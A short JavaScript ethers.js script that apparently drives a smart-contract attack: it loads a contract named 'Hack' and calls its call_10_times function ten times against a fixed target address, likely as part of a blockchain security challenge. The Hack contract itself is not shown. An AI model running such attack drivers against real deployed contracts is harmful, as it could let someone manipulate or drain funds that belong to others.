let { ethers } = require('ethers');

let Hack = require('./artifacts/contracts/Hack.sol/Hack.json');
let PRIVATE_KEY = "";
let network = "";
let Contract_address = "0xf7725b500B2ec77044986448ABb627224DD30dDb";


let provider = new ethers.providers.JsonRpcProvider(network);                        // read from blockchain
let signer =new ethers.Wallet(PRIVATE_KEY, provider);                              //  write on blockchain
let i = new ethers.Contract(Contract_address,Hack.abi,signer);                          // contract_instance

    let main = async()=>
    { 
        for(let j=0;j<10;j++)
        {
            await i.call_10_times("0xecf80539AeB6fc05589183248fbD6dF335Ae18c1",{gasLimit: 5000000});
        }
    }


    main().catch((error) => {
        console.error(error);
        process.exitCode = 1;
    });
